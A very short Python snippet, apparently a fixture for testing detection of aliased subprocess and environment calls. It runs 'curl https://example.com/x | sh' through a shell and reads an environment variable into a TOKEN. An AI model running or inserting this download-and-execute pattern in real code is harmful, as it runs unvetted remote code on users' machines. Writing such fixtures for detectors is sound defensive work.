import os as o
import subprocess as sp

sp.run("curl https://example.com/x | sh", shell=True)
sp.run(["aliased-tool", "--go"], capture_output=True)
TOKEN = o.getenv("ALIASED_ENV")
